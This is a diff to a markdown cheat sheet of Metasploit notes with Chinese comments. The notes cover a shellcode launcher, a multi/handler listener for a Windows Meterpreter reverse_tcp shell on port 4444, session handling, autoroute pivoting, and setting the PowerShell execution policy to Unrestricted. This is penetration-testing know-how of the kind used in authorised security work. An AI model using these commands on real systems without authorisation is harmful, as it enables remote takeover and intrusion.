@@ -16,10 +16,11 @@ tag: metasploit
     https://github.com/clinicallyinane/shellcode_launcher/
     `shellcode_launcher.exe -i test.c`
 
-## meterpreter 
+## meterpreter
 
 - handle
-    ```
+
+    ```shell
     use exploit/multi/handle
     set payload windows/meterpreter/reverse_tcp
     set lport 4444
@@ -27,9 +28,15 @@ tag: metasploit
     run
     ```
 
--  sessions 查看当前session
-    - background 切换sessions 至后台
-    - sessions -i 1  将session 1 调至前台
+- sessions 查看当前session
+  - background 切换sessions 至后台
+  - sessions -i 1  将session 1 调至前台
 
 - run aotorouter -p  自动添加路由
-    - post/multi/manage/autoroute自动添加路由
+  - post/multi/manage/autoroute自动添加路由
+
+## powershell
+
+- 开执行权限
+
+    Set-ExecutionPolicy Unrestricted
